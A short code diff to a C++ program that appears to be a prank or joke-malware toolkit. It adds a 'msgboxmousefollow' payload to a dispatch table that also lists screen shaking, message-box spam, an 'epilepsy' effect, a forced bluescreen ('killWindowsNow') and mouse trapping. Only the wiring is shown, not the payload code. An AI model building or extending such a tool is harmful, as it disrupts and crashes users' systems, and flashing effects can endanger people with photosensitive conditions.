@@ -26,6 +26,7 @@ void printHelp(const char* a)
     printf("earthquake - screen shaking\n");
     printf("msgbox - spams messageboxes in random positions\n");
     printf("killWindowsNow - very bad\n");
+    printf("msgboxmousefollow - msgboxes follow the mouse\n");
 }
 
 int main(int argc, char* argv[])
@@ -50,7 +51,7 @@ int main(int argc, char* argv[])
         { "epilepsy", epilepsy },
         { "killWindowsNow", Utils::bluescreen },
         { "trapmouse", trapMouseForever },
-
+        { "msgboxmousefollow", msgboxmousefollow },
     };
 
     string payload = "msgbox";
